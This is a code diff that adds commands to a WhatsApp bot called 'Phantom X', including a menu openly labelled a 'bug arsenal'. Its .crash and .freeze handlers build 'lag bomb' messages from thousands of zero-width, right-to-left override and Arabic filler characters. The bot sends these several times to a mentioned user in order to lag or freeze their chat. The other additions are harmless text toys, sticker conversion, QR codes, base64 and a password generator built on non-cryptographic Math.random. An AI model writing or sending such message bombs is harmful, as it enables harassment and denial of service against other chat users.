@@ -587,6 +587,19 @@ function getMenuSections() {
         { emoji: '🔄', title: 'GC CLONE', items: [
             ['.clone ‹src› ‹dst› ‹batch› ‹mins›'], ['.stopclone'],
         ]},
+        { emoji: '💥', title: 'BUG TOOLS', items: [
+            ['.bugmenu'], ['.crash @user'],
+            ['.freeze @user'], ['.zalgo ‹text›'],
+            ['.bigtext ‹text›'], ['.invisible'],
+            ['.rtl ‹text›'], ['.mock ‹text›'],
+            ['.aesthetic ‹text›'], ['.reverse ‹text›'],
+            ['.clap ‹text›'],
+        ]},
+        { emoji: '🛠️', title: 'EXTRAS', items: [
+            ['.sticker'], ['.toimg'],
+            ['.qr ‹text›'], ['.genpwd ‹length›'],
+            ['.base64 encode/decode ‹text›'],
+        ]},
     ];
 }
 
@@ -2444,6 +2457,270 @@ async function handleMessage(sock, msg) {
                 let sTxt = "📅 *Active Schedules*\n━━━━━━━━━━━━━━━━━━━\n\n";
                 entries.forEach(s => { sTxt += `⏰ *${s.time}* — _"${s.message}"_\n`; });
                 await reply(sTxt);
+                break;
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ BUG TOOLS ░░░░░
+            // ════════════════════════════════════════
+
+            case ".bugmenu": {
+                const bugMenu =
+                    `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n` +
+                    `   ☠️  *P H A N T O M  X*  ☠️\n` +
+                    `   _B U G  A R S E N A L_\n` +
+                    `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n\n` +
+                    `⚠️ *USE RESPONSIBLY — OWNER ONLY* ⚠️\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `💣 *CRASH & FREEZE*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  ☠️  *.crash @user* — Send a lag bomb to a user's chat\n` +
+                    `  🧊  *.freeze @user* — Flood with invisible zero-width chars\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🎭 *TEXT CORRUPTION*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  👹  *.zalgo <text>* — Corrupt text with demonic chars\n` +
+                    `  📐  *.bigtext <text>* — Giant block letter text\n` +
+                    `  👁️  *.invisible* — Send a perfectly blank message\n` +
+                    `  ➡️  *.rtl <text>* — Flip text right-to-left\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `😂 *FUN TEXT TOOLS*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  🧽  *.mock <text>* — SpOnGeBoB mOcK tExT\n` +
+                    `  🌸  *.aesthetic <text>* — Ａｅｓｔｈｅｔｉｃ ｔｅｘｔ\n` +
+                    `  🔁  *.reverse <text>* — Reverse any text backwards\n` +
+                    `  👏  *.clap <text>* — Add 👏 between 👏 words 👏\n\n` +
+                    `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥\n` +
+                    `  ☠️ _Phantom X — Bug Division Active_ 💀\n` +
+                    `💥━━━━━━━━━━━━━━━━━━━━━━━━━━💥`;
+                await reply(bugMenu);
+                break;
+            }
+
+            case ".crash": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const crashMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const crashTarget = crashMentioned[0];
+                const zwChars = "\u200b\u200c\u200d\u2060\ufeff\u00ad";
+                const zwFlood = (zwChars.repeat(500) + "\n").repeat(20);
+                const rtlOverride = "\u202e";
+                const arabicBomb = "ه".repeat(300) + "\u0600".repeat(200);
+                const crashPayload =
+                    zwFlood +
+                    rtlOverride + "PHANTOM X" + "\n" +
+                    arabicBomb + "\n" +
+                    "\u0640".repeat(500) + "\n" +
+                    "\u200f".repeat(500) + "\n" +
+                    zwFlood;
+                const crashDest = crashTarget || from;
+                try {
+                    for (let i = 0; i < 3; i++) {
+                        await sock.sendMessage(crashDest, { text: crashPayload });
+                        await delay(500);
+                    }
+                    await reply(`💥 Crash bomb sent${crashTarget ? ` to @${crashTarget.split("@")[0]}` : ""}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            case ".freeze": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const freezeMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const freezeTarget = freezeMentioned[0];
+                const zwSet = ["\u200b","\u200c","\u200d","\u2060","\ufeff","\u00ad","\u200e","\u200f","\u202a","\u202b","\u202c","\u202d","\u202e","\u2061","\u2062","\u2063","\u2064"];
+                let freezePayload = "";
+                for (let i = 0; i < 2000; i++) {
+                    freezePayload += zwSet[i % zwSet.length];
+                }
+                const freezeDest = freezeTarget || from;
+                try {
+                    for (let i = 0; i < 5; i++) {
+                        await sock.sendMessage(freezeDest, { text: freezePayload });
+                        await delay(300);
+                    }
+                    await reply(`🧊 Freeze bomb sent${freezeTarget ? ` to @${freezeTarget.split("@")[0]}` : ""}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            case ".zalgo": {
+                const zalgoInput = parts.slice(1).join(" ").trim();
+                if (!zalgoInput) return reply("Usage: .zalgo <text>\nExample: .zalgo Phantom X");
+                const zalgoUp = ["\u030d","\u030e","\u0304","\u0305","\u033f","\u0311","\u0306","\u0310","\u0352","\u0357","\u0351","\u0307","\u0308","\u030a","\u0342","\u0343","\u0344","\u034a","\u034b","\u034c","\u0303","\u0302","\u030c","\u0350","\u0300","\u0301","\u030b","\u030f","\u0312","\u0313","\u0314","\u033d","\u0309","\u0363","\u0364","\u0365","\u0366","\u0367","\u0368","\u0369","\u036a","\u036b","\u036c","\u036d","\u036e","\u036f","\u033e","\u035b"];
+                const zalgoMid = ["\u0315","\u031b","\u0340","\u0341","\u0358","\u0321","\u0322","\u0327","\u0328","\u0334","\u0335","\u0336","\u034f","\u035c","\u035d","\u035e","\u035f","\u0360","\u0362","\u0338","\u0337","\u0361","\u0489"];
+                const zalgoDown = ["\u0316","\u0317","\u0318","\u0319","\u031c","\u031d","\u031e","\u031f","\u0320","\u0324","\u0325","\u0326","\u0329","\u032a","\u032b","\u032c","\u032d","\u032e","\u032f","\u0330","\u0331","\u0332","\u0333","\u0339","\u033a","\u033b","\u033c","\u0345","\u0347","\u0348","\u0349","\u034d","\u034e","\u0353","\u0354","\u0355","\u0356","\u0359","\u035a","\u0323"];
+                const randArr = arr => arr[Math.floor(Math.random() * arr.length)];
+                let zalgoOut = "";
+                for (const ch of zalgoInput) {
+                    zalgoOut += ch;
+                    const upCount = Math.floor(Math.random() * 6) + 2;
+                    const midCount = Math.floor(Math.random() * 3);
+                    const downCount = Math.floor(Math.random() * 6) + 2;
+                    for (let i = 0; i < upCount; i++) zalgoOut += randArr(zalgoUp);
+                    for (let i = 0; i < midCount; i++) zalgoOut += randArr(zalgoMid);
+                    for (let i = 0; i < downCount; i++) zalgoOut += randArr(zalgoDown);
+                }
+                await reply(`👹 *Z̷̢̛̪A̶̗͠L̵͖̒G̸͎̔O̴͕̊ T̵̤̀E̸͎̾X̵̯̾T̶̢̕*\n\n${zalgoOut}`);
+                break;
+            }
+
+            case ".bigtext": {
+                const bigtextInput = parts.slice(1).join(" ").trim();
+                if (!bigtextInput) return reply("Usage: .bigtext <text>\nExample: .bigtext PHANTOM");
+                const blockMap = {
+                    a:"🅰",b:"🅱",c:"🅲",d:"🅳",e:"🅴",f:"🅵",g:"🅶",h:"🅷",i:"🅸",j:"🅹",
+                    k:"🅺",l:"🅻",m:"🅼",n:"🅽",o:"🅾",p:"🅿",q:"🆀",r:"🆁",s:"🆂",t:"🆃",
+                    u:"🆄",v:"🆅",w:"🆆",x:"🆇",y:"🆈",z:"🆉"," ":"   ",
+                    "0":"0️⃣","1":"1️⃣","2":"2️⃣","3":"3️⃣","4":"4️⃣",
+                    "5":"5️⃣","6":"6️⃣","7":"7️⃣","8":"8️⃣","9":"9️⃣",
+                };
+                const bigOut = bigtextInput.toLowerCase().split("").map(c => blockMap[c] || c).join(" ");
+                await reply(`📐 *Big Text:*\n\n${bigOut}`);
+                break;
+            }
+
+            case ".invisible": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const invChar = "\u2062\u2063\u2064\u200b\u200c\u200d\u00ad";
+                await sock.sendMessage(from, { text: invChar.repeat(50) });
+                break;
+            }
+
+            case ".rtl": {
+                const rtlInput = parts.slice(1).join(" ").trim();
+                if (!rtlInput) return reply("Usage: .rtl <text>\nExample: .rtl Hello World");
+                const rtlOut = "\u202e" + rtlInput;
+                await reply(`➡️ *RTL Text:*\n\n${rtlOut}`);
+                break;
+            }
+
+            case ".mock": {
+                const mockInput = parts.slice(1).join(" ").trim();
+                if (!mockInput) return reply("Usage: .mock <text>\nExample: .mock I am the best");
+                let mockOut = "";
+                let toggle = false;
+                for (const ch of mockInput) {
+                    if (ch === " ") { mockOut += " "; continue; }
+                    mockOut += toggle ? ch.toUpperCase() : ch.toLowerCase();
+                    toggle = !toggle;
+                }
+                await reply(`🧽 ${mockOut}`);
+                break;
+            }
+
+            case ".aesthetic": {
+                const aesInput = parts.slice(1).join(" ").trim();
+                if (!aesInput) return reply("Usage: .aesthetic <text>\nExample: .aesthetic phantom x");
+                const aesMap = "abcdefghijklmnopqrstuvwxyz0123456789";
+                const aesOut_chars = "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ０１２３４５６７８９";
+                let aesOut = "";
+                for (const ch of aesInput.toLowerCase()) {
+                    const idx = aesMap.indexOf(ch);
+                    aesOut += idx !== -1 ? [...aesOut_chars][idx] : ch === " " ? "　" : ch;
+                }
+                await reply(`🌸 ${aesOut}`);
+                break;
+            }
+
+            case ".reverse": {
+                const revInput = parts.slice(1).join(" ").trim();
+                if (!revInput) return reply("Usage: .reverse <text>\nExample: .reverse Hello World");
+                const revOut = [...revInput].reverse().join("");
+                await reply(`🔁 *Reversed:*\n\n${revOut}`);
+                break;
+            }
+
+            case ".clap": {
+                const clapInput = parts.slice(1).join(" ").trim();
+                if (!clapInput) return reply("Usage: .clap <text>\nExample: .clap this is the best bot");
+                const clapOut = clapInput.split(" ").join(" 👏 ");
+                await reply(`👏 ${clapOut} 👏`);
+                break;
+            }
+
+            // ════════════════════════════════════════
+            // ░░░░░ EXTRAS ░░░░░
+            // ════════════════════════════════════════
+
+            case ".sticker": {
+                const stickerQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const stickerMsg = stickerQuoted || msg.message;
+                const stickerType = getContentType(stickerMsg);
+                if (!stickerMsg || !["imageMessage", "videoMessage"].includes(stickerType)) {
+                    return reply("🖼️ Reply to an *image* or short *video* with *.sticker* to convert it.\n\nExample: Reply to any image with _.sticker_");
+                }
+                try {
+                    await reply("⏳ Converting to sticker...");
+                    const fakeForSticker = stickerQuoted ? { ...msg, message: stickerQuoted } : msg;
+                    const mediaBuf = await downloadMediaMessage(fakeForSticker, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    if (stickerType === "imageMessage") {
+                        await sock.sendMessage(from, { sticker: mediaBuf }, { quoted: msg });
+                    } else {
+                        await sock.sendMessage(from, {
+                            video: mediaBuf,
+                            gifPlayback: false,
+                            seconds: 5,
+                        }, { quoted: msg });
+                        await reply("⚠️ Video stickers need ffmpeg. Sent as video instead.");
+                    }
+                } catch (e) { await reply(`❌ Sticker conversion failed: ${e?.message}`); }
+                break;
+            }
+
+            case ".toimg": {
+                const toImgQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const toImgMsg = toImgQuoted || msg.message;
+                const toImgType = getContentType(toImgMsg);
+                if (!toImgMsg || toImgType !== "stickerMessage") {
+                    return reply("🖼️ Reply to a *sticker* with *.toimg* to convert it to an image.");
+                }
+                try {
+                    await reply("⏳ Converting sticker to image...");
+                    const fakeForImg = toImgQuoted ? { ...msg, message: toImgQuoted } : msg;
+                    const imgBuf = await downloadMediaMessage(fakeForImg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    await sock.sendMessage(from, { image: imgBuf, caption: "🖼️ Sticker converted to image!" }, { quoted: msg });
+                } catch (e) { await reply(`❌ Conversion failed: ${e?.message}`); }
+                break;
+            }
+
+            case ".qr": {
+                const qrText = parts.slice(1).join(" ").trim();
+                if (!qrText) return reply("Usage: .qr <text or link>\nExample: .qr https://phantom-x.replit.app");
+                await reply("⏳ Generating QR code...");
+                try {
+                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(qrText)}`;
+                    const qrBuf = await fetchBuffer(qrUrl);
+                    await sock.sendMessage(from, { image: qrBuf, caption: `📱 *QR Code for:*\n_${qrText}_` }, { quoted: msg });
+                } catch (e) { await reply(`❌ QR generation failed: ${e?.message}`); }
+                break;
+            }
+
+            case ".genpwd": {
+                const pwdLen = Math.min(Math.max(parseInt(parts[1]) || 16, 6), 64);
+                const pwdChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?";
+                let pwd = "";
+                for (let i = 0; i < pwdLen; i++) {
+                    pwd += pwdChars[Math.floor(Math.random() * pwdChars.length)];
+                }
+                await reply(`🔐 *Generated Password (${pwdLen} chars):*\n\n\`${pwd}\`\n\n_Keep this safe! Don't share it._`);
+                break;
+            }
+
+            case ".base64": {
+                const b64Sub = parts[1]?.toLowerCase();
+                const b64Text = parts.slice(2).join(" ").trim();
+                if (!b64Sub || !b64Text || !["encode","decode"].includes(b64Sub)) {
+                    return reply("Usage:\n*.base64 encode <text>*\n*.base64 decode <base64>*\n\nExample: .base64 encode Hello World");
+                }
+                try {
+                    if (b64Sub === "encode") {
+                        const encoded = Buffer.from(b64Text, "utf8").toString("base64");
+                        await reply(`🔒 *Base64 Encoded:*\n\n\`${encoded}\``);
+                    } else {
+                        const decoded = Buffer.from(b64Text, "base64").toString("utf8");
+                        await reply(`🔓 *Base64 Decoded:*\n\n${decoded}`);
+                    }
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
